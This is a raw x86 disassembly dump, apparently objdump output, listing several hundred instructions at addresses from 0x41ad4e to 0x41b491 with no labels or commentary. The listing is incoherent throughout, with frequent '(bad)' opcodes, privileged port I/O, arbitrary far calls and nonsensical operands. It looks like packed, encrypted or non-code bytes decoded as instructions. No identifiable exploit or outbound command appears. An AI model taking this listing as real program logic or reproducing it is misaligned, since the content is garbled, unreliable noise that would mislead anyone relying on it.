  41ad4e:	xor    DWORD PTR [esi-0x459aab9b],ebp
  41ad54:	iret   
  41ad55:	call   0x21d7:0xb5acf111
  41ad5c:	or     al,0x1c
  41ad5e:	arpl   WORD PTR ds:0x6564b40c,si
  41ad64:	sbb    BYTE PTR [eax-0x2320c34a],bl
  41ad6a:	inc    ebp
  41ad6b:	dec    ecx
  41ad6c:	icebp  
  41ad6d:	rcr    BYTE PTR ds:[edi+0x1d],1
  41ad71:	jmp    0x28b7df1c
  41ad76:	mov    dh,0x72
  41ad78:	das    
  41ad79:	int    0x83
  41ad7b:	jp     0x41adce
  41ad7d:	pushf  
  41ad7e:	mov    eax,0xaf99e2e5
  41ad83:	or     eax,0xd43ad54d
  41ad88:	add    eax,0x691c8c7a
  41ad8d:	inc    edx
  41ad8e:	pop    esp
  41ad8f:	mov    ch,0x23
  41ad91:	xrelease mov BYTE PTR [ecx+0x5fe57829],ah
  41ad98:	inc    ebx
  41ad99:	pop    ds
  41ad9a:	or     DWORD PTR [eax+0x2b26e4c4],ebp
  41ada0:	jecxz  0x41ad4e
  41ada2:	dec    ebx
  41ada3:	inc    esi
  41ada4:	cwde   
  41ada5:	pop    ecx
  41ada6:	push   esp
  41ada7:	es stc 
  41ada9:	mov    ds:0x1c5a80eb,eax
  41adae:	icebp  
  41adaf:	fdiv   DWORD PTR [ebp-0x10d4b25b]
  41adb5:	pop    ebp
  41adb6:	add    dl,BYTE PTR [edx-0x25]
  41adb9:	call   0x32248144
  41adbe:	or     dh,BYTE PTR [esi]
  41adc0:	mov    ebp,0x1aff8e39
  41adc5:	sub    al,BYTE PTR [esi-0x2d]
  41adc8:	adc    ch,BYTE PTR [bx+di-0x14dc]
  41adcd:	adc    ah,BYTE PTR gs:[ecx-0x6e9d08b2]
  41add4:	cmp    eax,DWORD PTR [eax-0x3a61ad8a]
  41adda:	cdq    
  41addb:	cmp    ebp,edi
  41addd:	call   0x3839:0x2af96ed0
  41ade4:	loop   0x41ae01
  41ade6:	loope  0x41adbd
  41ade8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ade9:	jl     0x41adcf
  41adeb:	and    DWORD PTR [edx-0x24],esi
  41adee:	adc    eax,DWORD PTR [ebx-0x5a]
  41adf1:	xchg   edx,eax
  41adf2:	push   edi
  41adf3:	rcr    BYTE PTR [edi+0x67],1
  41adf6:	mov    DWORD PTR [eax],esp
  41adf8:	mov    ebp,0x44ef8b8f
  41adfd:	mov    ds:0xa0539165,al
  41ae02:	xor    BYTE PTR fs:[ecx+0x14],bl
  41ae06:	xchg   edi,eax
  41ae07:	ret    0x8852
  41ae0a:	in     eax,dx
  41ae0b:	outs   dx,DWORD PTR ds:[esi]
  41ae0c:	or     ecx,DWORD PTR [ebx]
  41ae0e:	adc    ah,ah
  41ae10:	sbb    DWORD PTR [eax],ebp
  41ae12:	lahf   
  41ae13:	rcr    BYTE PTR [ecx-0x42],cl
  41ae16:	mov    bh,0x37
  41ae18:	add    DWORD PTR [ebx],ebx
  41ae1a:	and    edx,esi
  41ae1c:	sub    DWORD PTR [edx-0x6011e6d1],eax
  41ae22:	mov    edi,0x824cf0df
  41ae27:	xor    dl,bh
  41ae29:	stos   DWORD PTR es:[edi],eax
  41ae2a:	das    
  41ae2b:	xchg   edi,eax
  41ae2c:	dec    esp
  41ae2d:	ins    BYTE PTR es:[edi],dx
  41ae2e:	cmp    ah,ch
  41ae30:	scas   al,BYTE PTR es:[edi]
  41ae31:	xchg   edi,eax
  41ae32:	inc    edi
  41ae33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae34:	jne    0x41ae8b
  41ae36:	and    BYTE PTR [esi+0x708e325c],cl
  41ae3c:	jns    0x41ae12
  41ae3e:	lds    edx,FWORD PTR [ebx+0x15]
  41ae41:	dec    ebx
  41ae42:	pushf  
  41ae43:	xchg   esi,eax
  41ae44:	out    dx,al
  41ae45:	inc    esp
  41ae46:	cmp    al,0xbe
  41ae48:	outs   dx,DWORD PTR ds:[esi]
  41ae49:	push   ds
  41ae4a:	paddsb mm1,QWORD PTR [esi+0x15]
  41ae4e:	imul   DWORD PTR [edi]
  41ae50:	arpl   WORD PTR [esi+0x44],sp
  41ae53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae54:	jg     0x41ae89
  41ae56:	stos   BYTE PTR es:[edi],al
  41ae57:	out    dx,al
  41ae58:	xchg   esp,eax
  41ae59:	pop    esp
  41ae5a:	iret   
  41ae5b:	ret    
  41ae5c:	shl    DWORD PTR [esi+edx*2],0x7b
  41ae60:	js     0x41ae3f
  41ae62:	(bad)  
  41ae64:	adc    edi,DWORD PTR [esi-0x53]
  41ae67:	dec    DWORD PTR [ebx]
  41ae69:	sahf   
  41ae6a:	mov    ecx,0xdf44b16d
  41ae6f:	jo     0x41aef0
  41ae71:	pop    ss
  41ae72:	mov    bl,0x3
  41ae74:	daa    
  41ae75:	outs   dx,BYTE PTR ds:[esi]
  41ae76:	out    0x2,eax
  41ae78:	retf   0x49aa
  41ae7b:	dec    ebx
  41ae7c:	gs push cs
  41ae7e:	pushf  
  41ae7f:	(bad)  
  41ae80:	mov    cl,0xf5
  41ae82:	fcom   QWORD PTR [ebp+0x7]
  41ae85:	push   ecx
  41ae86:	sub    eax,0xcd1ecd51
  41ae8b:	(bad)
  41ae8e:	jmp    0x41aee9
  41ae90:	aam    0xa7
  41ae92:	mov    ah,0x7e
  41ae94:	push   edx
  41ae95:	rcr    DWORD PTR [ebp+0x6d3b50a1],1
  41ae9b:	add    ch,BYTE PTR [ecx-0x7cef61e9]
  41aea1:	push   ebp
  41aea2:	call   0x60ed:0x2fdfa319
  41aea9:	mov    al,ds:0x710e7040
  41aeae:	cmp    al,0x27
  41aeb0:	loopne 0x41ae97
  41aeb2:	sub    DWORD PTR ds:0x28d02c35,edx
  41aeb8:	ins    DWORD PTR es:[edi],dx
  41aeb9:	dec    eax
  41aeba:	aam    0xbe
  41aebc:	jg     0x41af2a
  41aebe:	xor    DWORD PTR [ebx+0x7b],edx
  41aec1:	outs   dx,DWORD PTR ds:[esi]
  41aec2:	(bad)
  41aec6:	mov    fs,ebp
  41aec8:	pop    ebp
  41aec9:	inc    ecx
  41aeca:	int3   
  41aecb:	(bad)  
  41aecc:	xchg   ecx,eax
  41aecd:	mov    dl,0x3f
  41aecf:	xchg   ecx,eax
  41aed0:	idiv   BYTE PTR [ecx-0x72]
  41aed3:	and    al,0x5b
  41aed5:	pop    esp
  41aed6:	inc    esp
  41aed7:	push   ss
  41aed8:	xchg   ch,bh
  41aeda:	mov    eax,ds:0xc1bf5a21
  41aedf:	scas   al,BYTE PTR es:[edi]
  41aee0:	pop    ss
  41aee1:	jp     0x41af1b
  41aee3:	mov    cl,0xf4
  41aee5:	or     BYTE PTR [edi-0x6279f9a5],bh
  41aeeb:	push   esp
  41aeec:	mov    cl,0xbf
  41aeee:	xchg   ebp,eax
  41aeef:	stc    
  41aef0:	mov    bh,0x42
  41aef2:	push   esi
  41aef3:	ror    BYTE PTR ds:0xbe82c067,0xbd
  41aefa:	dec    esi
  41aefb:	inc    ebp
  41aefc:	out    dx,eax
  41aefd:	repnz stos BYTE PTR es:[edi],al
  41aeff:	jge    0x41ae9d
  41af01:	dec    edi
  41af02:	sub    DWORD PTR [eax+0x62],ebx
  41af05:	mov    ch,0x90
  41af07:	and    eax,DWORD PTR [esi]
  41af09:	loop   0x41aeb0
  41af0b:	cmp    ebp,DWORD PTR [eax+ebx*2+0x793badec]
  41af12:	dec    ecx
  41af13:	aad    0xc8
  41af15:	aad    0x6c
  41af17:	sub    al,0x3b
  41af19:	(bad)  
  41af1b:	jns    0x41af0f
  41af1d:	push   ss
  41af1e:	mov    ebx,0xf915082b
  41af23:	mov    DWORD PTR [esi+0x5ae31b5f],ebx
  41af29:	jb     0x41af0e
  41af2b:	push   esi
  41af2c:	mov    BYTE PTR [ebx+0x4a965af9],dl
  41af32:	aad    0xa2
  41af34:	bound  esi,QWORD PTR [ebx-0x537a974a]
  41af3a:	push   0x7697d617
  41af3f:	and    eax,0x85447a74
  41af44:	pop    ecx
  41af45:	push   0x53b9f7f3
  41af4a:	out    dx,al
  41af4b:	and    al,0x15
  41af4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af4e:	lea    esi,[edi]
  41af50:	push   es
  41af51:	aas    
  41af52:	jecxz  0x41af95
  41af54:	jp     0x41af6a
  41af56:	pop    edx
  41af57:	imul   ebx,DWORD PTR ds:0xd5e99a9e,0xffffff86
  41af5e:	cs inc ebx
  41af60:	rol    BYTE PTR [esi],1
  41af62:	mov    ah,0x96
  41af64:	inc    esp
  41af65:	sub    cl,BYTE PTR [bp+di-0x546f]
  41af6a:	jmp    0x41af2c
  41af6c:	shl    BYTE PTR [ebx],1
  41af6e:	inc    ecx
  41af6f:	ins    BYTE PTR es:[edi],dx
  41af70:	push   edi
  41af71:	pushf  
  41af72:	ds xchg esi,eax
  41af74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af75:	jge    0x41af20
  41af77:	lea    eax,[edx+0x5d]
  41af7a:	out    dx,al
  41af7b:	mov    ds:0xbad9d538,al
  41af80:	ins    DWORD PTR es:[edi],dx
  41af81:	popf   
  41af82:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41af84:	xchg   esp,eax
  41af85:	pusha  
  41af86:	pop    ds
  41af87:	fs push 0x50
  41af8a:	jp     0x41af0c
  41af8c:	bound  esp,QWORD PTR [ebx-0x1bf6ef53]
  41af92:	hlt    
  41af93:	clc    
  41af94:	push   cs
  41af95:	xchg   edi,eax
  41af96:	inc    edx
  41af97:	mov    eax,DWORD PTR [ebx+eax*4]
  41af9a:	loop   0x41afdc
  41af9c:	shr    DWORD PTR [esi],cl
  41af9e:	bound  esi,QWORD PTR [edx+0x41a679f3]
  41afa4:	rcl    BYTE PTR [esi-0x38563997],0x77
  41afab:	jecxz  0x41afae
  41afad:	sbb    esi,DWORD PTR [edx+0x58b4b7cd]
  41afb3:	imul   eax,DWORD PTR [eax-0x69],0xffffff84
  41afb7:	jne    0x41af85
  41afb9:	ds aaa 
  41afbb:	cmovp  esp,DWORD PTR [ebx-0x3773a959]
  41afc2:	ss dec esi
  41afc4:	inc    edi
  41afc5:	ins    DWORD PTR es:[edi],dx
  41afc6:	sti    
  41afc7:	dec    esp
  41afc8:	in     al,dx
  41afc9:	in     al,dx
  41afca:	lods   al,BYTE PTR ds:[esi]
  41afcb:	pop    eax
  41afcc:	scas   al,BYTE PTR es:[edi]
  41afcd:	pop    edx
  41afce:	sub    BYTE PTR [ebx],al
  41afd0:	bound  ecx,QWORD PTR [esp+edi*8-0x2b]
  41afd4:	pop    esi
  41afd5:	in     al,0xf6
  41afd7:	outs   dx,BYTE PTR ds:[esi]
  41afd8:	stc    
  41afd9:	aas    
  41afda:	dec    BYTE PTR [edx-0x26c7e5f0]
  41afe0:	and    al,al
  41afe2:	cmc    
  41afe3:	sahf   
  41afe4:	cmp    dh,0x5c
  41afe7:	pop    ds
  41afe8:	fild   DWORD PTR [ebx]
  41afea:	pushf  
  41afeb:	lea    ecx,[ecx]
  41afed:	inc    ebx
  41afee:	int    0xbb
  41aff0:	cdq    
  41aff1:	les    eax,FWORD PTR [esp+edx*4+0x77c2544]
  41aff8:	mov    cl,0x8
  41affa:	push   0x47dd8cde
  41afff:	enter  0x23c1,0x81
  41b003:	mov    edx,0x4612edf1
  41b008:	add    BYTE PTR [eax+0x5d098093],ah
  41b00e:	mul    BYTE PTR [esi-0x254cb2ef]
  41b014:	pop    ebp
  41b015:	xchg   ebp,eax
  41b016:	mov    ch,BYTE PTR [ebx+0x60cdfcdc]
  41b01c:	sbb    edi,esp
  41b01e:	xchg   esi,eax
  41b01f:	add    BYTE PTR [edx+0x53],0x96
  41b023:	jecxz  0x41b056
  41b025:	mov    dh,0xd2
  41b027:	sahf   
  41b028:	jb     0x41b034
  41b02a:	popf   
  41b02b:	outs   dx,BYTE PTR ds:[esi]
  41b02c:	mov    al,ds:0x949615e3
  41b031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b032:	jp     0x41afc7
  41b034:	jnp    0x41afea
  41b036:	pop    ebx
  41b037:	inc    esi
  41b038:	test   eax,0x4d5e9da8
  41b03d:	pop    ebp
  41b03e:	and    BYTE PTR [esi+0x55],dl
  41b041:	ror    DWORD PTR [eax],cl
  41b043:	or     eax,0x32e86ad4
  41b048:	push   edx
  41b049:	mov    dh,0xcb
  41b04b:	outs   dx,BYTE PTR ds:[esi]
  41b04c:	or     DWORD PTR [edi+eiz*1-0x1],ecx
  41b050:	pop    ds
  41b051:	mov    cl,0xd5
  41b053:	lods   al,BYTE PTR ds:[esi]
  41b054:	and    DWORD PTR [edi],ebp
  41b056:	imul   ebp,edx,0xdacae315
  41b05c:	adc    eax,0x5826e6f4
  41b061:	jecxz  0x41aff6
  41b063:	or     al,BYTE PTR [edx-0x2]
  41b066:	push   ss
  41b067:	test   eax,0x80124dac
  41b06c:	ror    BYTE PTR [ecx-0x51],cl
  41b06f:	mov    ds:0x892b6c97,al
  41b074:	push   0xf116f056
  41b079:	push   esp
  41b07a:	jmp    0xb88a:0x2539b8a7
  41b081:	jne    0x41b054
  41b083:	sub    eax,0xa263e3b7
  41b088:	aad    0xdf
  41b08a:	lds    ebx,FWORD PTR [eax+esi*8]
  41b08d:	mov    al,BYTE PTR [esi-0x71]
  41b090:	mov    dh,BYTE PTR [eax-0x3bce96d5]
  41b096:	clc    
  41b097:	fisttp WORD PTR [ecx+eiz*2]
  41b09a:	cmc    
  41b09b:	mov    bl,0xfc
  41b09d:	push   ds
  41b09e:	sahf   
  41b09f:	shr    DWORD PTR [eax],1
  41b0a1:	jo     0x41b113
  41b0a3:	pop    ebp
  41b0a4:	mov    ds:0x3b6e644,al
  41b0a9:	jb     0x41b0b7
  41b0ab:	fild   DWORD PTR [ecx+0x60]
  41b0ae:	icebp  
  41b0af:	popa   
  41b0b0:	adc    dl,BYTE PTR [ecx-0x22]
  41b0b3:	and    eax,0x7be895a7
  41b0b8:	jg     0x41b0f6
  41b0ba:	leave  
  41b0bb:	in     al,0xa
  41b0bd:	fild   WORD PTR [edi]
  41b0bf:	xlat   BYTE PTR ds:[ebx]
  41b0c0:	push   edx
  41b0c1:	mul    BYTE PTR [edx+0x7741887d]
  41b0c7:	hlt    
  41b0c8:	(bad)  
  41b0c9:	push   0x22
  41b0cb:	js     0x41b053
  41b0cd:	push   edx
  41b0ce:	ret    
  41b0cf:	jmp    0xb8a9cba7
  41b0d4:	popf   
  41b0d5:	test   BYTE PTR [edi+0x51531299],bl
  41b0db:	pop    edi
  41b0dc:	pusha  
  41b0dd:	dec    ebp
  41b0de:	lahf   
  41b0df:	push   ebp
  41b0e0:	mov    dh,0x4e
  41b0e2:	mov    dl,0x46
  41b0e4:	pop    esp
  41b0e5:	popa   
  41b0e6:	cmp    bl,dl
  41b0e8:	xchg   ecx,eax
  41b0e9:	das    
  41b0ea:	jno    0x41b0cf
  41b0ec:	mov    eax,ds:0xc5323d80
  41b0f1:	mov    al,ds:0xa4f0f82a
  41b0f6:	scas   al,BYTE PTR es:[edi]
  41b0f7:	mov    esi,0xf7687631
  41b0fc:	fsubr  QWORD PTR [ebp-0x11]
  41b0ff:	pop    esp
  41b100:	jne    0x41b148
  41b102:	repz add bl,BYTE PTR [ecx-0x77]
  41b106:	cs (bad) 
  41b108:	sbb    BYTE PTR [ebx+0x3e65700b],dh
  41b10e:	out    0x83,eax
  41b110:	dec    BYTE PTR [ebx]
  41b112:	nop
  41b113:	fs inc esp
  41b115:	jbe    0x41b12b
  41b117:	sub    al,0xce
  41b119:	adc    al,BYTE PTR [esi]
  41b11b:	and    eax,0xf6615512
  41b120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b121:	outs   dx,BYTE PTR ds:[esi]
  41b122:	pop    edx
  41b123:	push   ecx
  41b124:	mov    eax,ds:0x2b4b79ca
  41b129:	aas    
  41b12a:	ret    
  41b12b:	inc    ecx
  41b12c:	rcl    BYTE PTR [edi+eiz*8],1
  41b12f:	mov    edi,0xef8933d4
  41b134:	or     esp,edx
  41b136:	xchg   ebx,eax
  41b137:	xchg   edx,eax
  41b138:	jle    0x41b11e
  41b13a:	pop    esp
  41b13b:	je     0x41b15f
  41b13d:	shr    BYTE PTR [eax+0x367f4d59],1
  41b143:	inc    esi
  41b144:	and    DWORD PTR [ebp+0x56],edx
  41b147:	mov    dl,0x54
  41b149:	int3   
  41b14a:	ds push ebp
  41b14c:	jnp    0x41b175
  41b14e:	imul   ebx,DWORD PTR [esp+ebp*1],0xffffffc4
  41b152:	arpl   WORD PTR [esi-0x5f],ax
  41b155:	adc    ch,BYTE PTR [ecx]
  41b157:	and    ecx,ecx
  41b159:	or     DWORD PTR [edx],ebp
  41b15b:	(bad)  
  41b15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b15d:	fcom   QWORD PTR [edx-0x47d72eb5]
  41b163:	mov    bl,0x3c
  41b165:	and    al,0x37
  41b167:	lock faddp st(6),st
  41b16a:	iret   
  41b16b:	loop   0x41b1e6
  41b16d:	dec    edx
  41b16e:	mov    WORD PTR [edx],es
  41b170:	or     ebx,esp
  41b172:	aas    
  41b173:	mov    bl,0x5e
  41b175:	lea    esi,[eax]
  41b177:	jno    0x41b1f5
  41b179:	(bad)  
  41b17a:	imul   eax,ebx,0x7d
  41b17d:	jl     0x41b13c
  41b17f:	xchg   esp,eax
  41b180:	icebp  
  41b181:	push   ds
  41b182:	add    ebp,DWORD PTR [edi-0x6f]
  41b185:	pop    ss
  41b186:	push   ss
  41b187:	mov    esp,0x1170f903
  41b18c:	fild   QWORD PTR [edx-0x22c8b93e]
  41b192:	pop    ss
  41b193:	inc    esi
  41b194:	fmul   st,st(7)
  41b196:	or     al,0xf9
  41b198:	sbb    DWORD PTR [edi+0x7fa0e5ef],ecx
  41b19e:	lods   eax,DWORD PTR ds:[esi]
  41b19f:	jbe    0x41b1c6
  41b1a1:	lods   al,BYTE PTR ds:[esi]
  41b1a2:	into   
  41b1a3:	int3   
  41b1a4:	push   ecx
  41b1a5:	inc    eax
  41b1a6:	sbb    al,BYTE PTR [eax+edx*4+0x42]
  41b1aa:	retf   
  41b1ab:	jmp    0xaf7c:0x73ce508e
  41b1b2:	retf   0x62ac
  41b1b5:	inc    ecx
  41b1b6:	mov    bl,BYTE PTR [ebx-0x78]
  41b1b9:	out    0xec,eax
  41b1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1bc:	mov    bl,0x98
  41b1be:	xlat   BYTE PTR ds:[ebx]
  41b1bf:	jge    0x41b20a
  41b1c1:	sbb    esi,ebx
  41b1c3:	inc    esi
  41b1c4:	outs   dx,BYTE PTR ds:[esi]
  41b1c5:	scas   eax,DWORD PTR es:[edi]
  41b1c6:	xlat   BYTE PTR ds:[ebx]
  41b1c7:	rol    DWORD PTR [ebp-0x9],0xad
  41b1cb:	lods   al,BYTE PTR ds:[esi]
  41b1cc:	je     0x41b16b
  41b1ce:	push   edi
  41b1cf:	mov    WORD PTR [edi-0x33],ds
  41b1d2:	sub    DWORD PTR [esi+0x71],ecx
  41b1d5:	std    
  41b1d6:	pop    ebp
  41b1d7:	cld    
  41b1d8:	scas   eax,DWORD PTR es:[edi]
  41b1d9:	dec    edx
  41b1da:	loop   0x41b22a
  41b1dc:	fdivr  st(6),st
  41b1de:	jae    0x41b1d6
  41b1e0:	pop    edx
  41b1e1:	sub    eax,0x65ed45e8
  41b1e6:	mov    bh,dl
  41b1e8:	mov    esi,0xf7e62759
  41b1ed:	clc    
  41b1ee:	fidivr WORD PTR [ecx+0xe97ab21]
  41b1f4:	fwait
  41b1f5:	(bad)  
  41b1f6:	ins    BYTE PTR es:[edi],dx
  41b1f7:	js     0x41b250
  41b1f9:	push   esi
  41b1fa:	add    eax,0xd6dd10ca
  41b1ff:	xor    DWORD PTR [edi],eax
  41b201:	lock je 0x41b1bd
  41b204:	int    0xc9
  41b206:	pusha  
  41b207:	scas   al,BYTE PTR es:[edi]
  41b208:	pushf  
  41b209:	daa    
  41b20a:	leave  
  41b20b:	inc    esp
  41b20c:	push   ss
  41b20d:	gs cmp al,0xb2
  41b210:	cmp    DWORD PTR [ebp+0x5fba9195],edi
  41b216:	mov    cl,ah
  41b218:	jno    0x41b210
  41b21a:	mov    ebx,cs
  41b21c:	test   al,0xb5
  41b21e:	icebp  
  41b21f:	cmp    al,0x75
  41b221:	push   edx
  41b222:	imul   esi,esi,0x28
  41b225:	mov    dl,0x9b
  41b227:	fcomp  QWORD PTR [esi+0x34c1291]
  41b22d:	push   es
  41b22e:	test   al,0xd8
  41b230:	mov    ebp,0x2c2005d6
  41b235:	xchg   ebx,eax
  41b236:	mov    eax,ds:0x617ea83a
  41b23b:	and    BYTE PTR [ecx+0x590dd975],cl
  41b241:	iret   
  41b242:	les    eax,FWORD PTR [esp+eax*2+0x77]
  41b246:	cdq    
  41b247:	sar    BYTE PTR [ebp-0x20],1
  41b24a:	add    DWORD PTR [ebx-0x9ccba8b],esp
  41b250:	aad    0x25
  41b252:	mov    eax,ds:0x504d598e
  41b257:	pop    edx
  41b258:	shl    esi,0xa5
  41b25b:	fbstp  TBYTE PTR [ebx+edx*4+0x44]
  41b25f:	addr16 pop ecx
  41b261:	int    0x72
  41b263:	(bad)  
  41b264:	dec    eax
  41b265:	lea    eax,es:[ebx-0x7fe31bbe]
  41b26c:	aam    0xfc
  41b26e:	call   0xf69c:0x878a5361
  41b275:	ret    0x88cc
  41b278:	(bad)  
  41b279:	arpl   WORD PTR [edx-0x36],bx
  41b27c:	lds    ecx,FWORD PTR ds:0x6ed7da2a
  41b282:	inc    eax
  41b283:	mov    edi,0x122a5670
  41b288:	dec    eax
  41b289:	(bad)  
  41b28a:	xor    eax,0x19f887c3
  41b28f:	popf   
  41b290:	mov    ebx,DWORD PTR ds:[esi]
  41b293:	js     0x41b2b7
  41b295:	xor    al,0x86
  41b297:	jmp    0x47618012
  41b29c:	pop    ebp
  41b29d:	xchg   esp,eax
  41b29e:	sbb    eax,0xbccd3c13
  41b2a3:	cmp    al,0xf
  41b2a5:	or     DWORD PTR fs:[ebp-0x64],ebx
  41b2a9:	(bad)  
  41b2aa:	push   ds
  41b2ab:	test   DWORD PTR [eax+0x37dac7ff],esi
  41b2b1:	out    dx,eax
  41b2b2:	push   edi
  41b2b3:	jo     0x41b324
  41b2b5:	mov    cl,0xef
  41b2b7:	imul   edi,DWORD PTR [esi-0x7],0x3b0e7c04
  41b2be:	jmp    0x4e8b:0x57ea4b86
  41b2c5:	test   al,0x3a
  41b2c7:	mov    eax,0xb547f63f
  41b2cc:	or     ebx,DWORD PTR [edi+0x16]
  41b2cf:	call   0x662bd6a3
  41b2d4:	dec    edi
  41b2d5:	pusha  
  41b2d6:	mov    cl,0x62
  41b2d8:	jecxz  0x41b270
  41b2da:	mov    fs,WORD PTR [ecx-0x6822c688]
  41b2e0:	hlt    
  41b2e1:	sub    ebp,edx
  41b2e3:	and    eax,0xd381f678
  41b2e8:	add    eax,0x3036fe83
  41b2ed:	push   es
  41b2ee:	mov    DWORD PTR [edi],ecx
  41b2f0:	mov    ch,0xd3
  41b2f2:	mov    ebx,0xfd777ce
  41b2f7:	push   eax
  41b2f8:	sbb    DWORD PTR [esi],eax
  41b2fa:	fbld   TBYTE PTR [edx+ebp*8]
  41b2fd:	jae    0x41b365
  41b2ff:	pop    ds
  41b300:	mov    ds:0x90cbe978,al
  41b305:	inc    ebp
  41b306:	push   cs
  41b307:	sub    al,0x59
  41b309:	es icebp 
  41b30b:	test   DWORD PTR ds:0x6e4ea4d9,esp
  41b311:	pop    eax
  41b312:	aam    0x26
  41b314:	mov    bl,BYTE PTR [edx]
  41b316:	cli    
  41b317:	imul   esi,ebp,0x65
  41b31a:	cmp    edx,ecx
  41b31c:	pusha  
  41b31d:	call   0x6067fde0
  41b322:	popa   
  41b323:	and    ecx,DWORD PTR [ecx]
  41b325:	inc    edx
  41b326:	sbb    eax,0xf44a05d1
  41b32b:	ficom  WORD PTR [ecx+0x4ab4b0b2]
  41b331:	addr16 popf 
  41b333:	shl    BYTE PTR [ebp+0x47],0xdb
  41b337:	test   BYTE PTR [edx],0x73
  41b33a:	repz or al,0x40
  41b33d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b33e:	(bad)  
  41b340:	dec    ebp
  41b341:	mov    ecx,0xd418e3b9
  41b346:	jle    0x41b2ff
  41b348:	outs   dx,DWORD PTR ds:[esi]
  41b349:	ror    BYTE PTR [ebx+0x3b],cl
  41b34c:	cld    
  41b34d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b34e:	out    0xc6,al
  41b350:	int    0xad
  41b352:	ret    0x129c
  41b355:	out    0x68,al
  41b357:	mov    DWORD PTR [edx-0x13dd03a3],ebp
  41b35d:	hlt    
  41b35e:	inc    esp
  41b35f:	lods   eax,DWORD PTR gs:[esi]
  41b361:	cdq    
  41b362:	inc    ebx
  41b363:	push   cs
  41b364:	sahf   
  41b365:	adc    edi,0xffffff92
  41b368:	jb     0x41b314
  41b36a:	pop    ebp
  41b36c:	and    BYTE PTR [edx],cl
  41b36e:	je     0x41b30d
  41b370:	dec    ebx
  41b371:	mov    al,ds:0x1d3da88a
  41b376:	sub    ebx,DWORD PTR [edx+0x50d8b54a]
  41b37c:	repnz das 
  41b37e:	aam    0xbe
  41b380:	in     eax,0x68
  41b382:	xor    edx,DWORD PTR [esi]
  41b384:	pop    esi
  41b385:	jnp    0x41b35c
  41b387:	jne    0x41b32c
  41b389:	pop    esi
  41b38a:	(bad)  [esi+ebp*8-0x1a711675]
  41b391:	outs   dx,DWORD PTR ds:[esi]
  41b392:	ret    0xa0db
  41b395:	adc    ah,BYTE PTR [esi]
  41b397:	cmc    
  41b398:	mov    ?,WORD PTR [eax-0x30a0d155]
  41b39e:	mov    ch,0x7a
  41b3a0:	repnz cmp al,0x38
  41b3a3:	cmp    DWORD PTR [ebx],eax
  41b3a5:	jg     0x41b3fd
  41b3a7:	in     eax,dx
  41b3a8:	xchg   ebp,eax
  41b3a9:	push   dx
  41b3ab:	inc    edi
  41b3ac:	adc    al,0x5
  41b3ae:	mov    al,0xf4
  41b3b0:	gs js  0x41b422
  41b3b3:	jo     0x41b33d
  41b3b5:	inc    ebp
  41b3b6:	mov    ebp,0x3e1eba39
  41b3bb:	jge    0x41b3bd
  41b3bd:	push   cs
  41b3be:	sbb    eax,DWORD PTR [eax+ecx*4-0x2ae6d091]
  41b3c5:	int3   
  41b3c6:	xchg   ch,ah
  41b3c8:	jae    0x41b3ab
  41b3ca:	adc    DWORD PTR [eax-0x3397ab83],eax
  41b3d0:	cld    
  41b3d1:	xchg   esi,eax
  41b3d2:	cmp    al,0x22
  41b3d4:	adc    dh,BYTE PTR [edx]
  41b3d6:	jns    0x41b359
  41b3d8:	test   al,bh
  41b3da:	dec    esi
  41b3db:	xchg   esi,eax
  41b3dc:	sbb    eax,0x53b69ec9
  41b3e1:	int    0x62
  41b3e3:	es dec edx
  41b3e5:	sub    al,0x6e
  41b3e7:	dec    ebx
  41b3e8:	pop    edi
  41b3e9:	fbstp  TBYTE PTR [ebx-0x66dd6056]
  41b3ef:	jecxz  0x41b463
  41b3f1:	xlat   BYTE PTR ds:[ebx]
  41b3f2:	imul   esi,DWORD PTR [esi-0x3c],0x2b
  41b3f6:	(bad)  
  41b3f8:	mul    BYTE PTR [ecx]
  41b3fa:	or     eax,0x3a1a83f6
  41b3ff:	(bad)  
  41b401:	fdivr  QWORD PTR ds:0xf61c9576
  41b407:	add    BYTE PTR [ebp+0x6ce632bb],dh
  41b40d:	test   BYTE PTR [ebp-0x71],dl
  41b410:	xchg   ecx,eax
  41b411:	dec    ebp
  41b412:	call   0xa0b2:0xc46b85af
  41b419:	lahf   
  41b41a:	push   ds
  41b41b:	in     eax,0xc8
  41b41d:	inc    edx
  41b41e:	sbb    al,0xc8
  41b420:	sub    DWORD PTR [edx+0x561c83d7],0xa757565c
  41b42a:	dec    eax
  41b42b:	add    DWORD PTR ds:0x19640d61,0xffffff87
  41b432:	mov    ds:0xa49f50ab,al
  41b437:	sbb    dl,al
  41b439:	add    DWORD PTR fs:[esp+ebp*1+0x6893f470],edi
  41b441:	xlat   BYTE PTR ds:[ebx]
  41b442:	jo     0x41b446
  41b444:	xchg   edx,eax
  41b445:	call   0x53cb:0xf7610081
  41b44c:	xchg   esi,eax
  41b44d:	xchg   esp,eax
  41b44e:	sti    
  41b44f:	jle    0x41b3f2
  41b451:	add    ah,al
  41b453:	mov    eax,ds:0xc38027d7
  41b458:	pop    esp
  41b459:	push   0xffffff96
  41b45b:	add    al,0xa4
  41b45d:	xor    BYTE PTR [edx+eax*4-0x4d078cd8],0x3e
  41b465:	jp     0x41b4b9
  41b467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b468:	cli    
  41b469:	cmp    DWORD PTR [ebp+0x28],0xffffff94
  41b46d:	dec    edi
  41b46e:	jo     0x41b450
  41b470:	rcr    BYTE PTR [ecx+0x32],0x79
  41b474:	shl    DWORD PTR [edx-0x1b],0x71
  41b478:	push   0x855c976
  41b47d:	int    0xeb
  41b47f:	adc    edx,eax
  41b481:	adc    DWORD PTR [edi-0x15],esp
  41b484:	and    DWORD PTR [edi],ebp
  41b486:	aad    0x24
  41b488:	or     eax,0x37d3dfbe
  41b48d:	stc    
  41b48e:	add    ah,BYTE PTR [esi]
  41b490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b491:	aas    
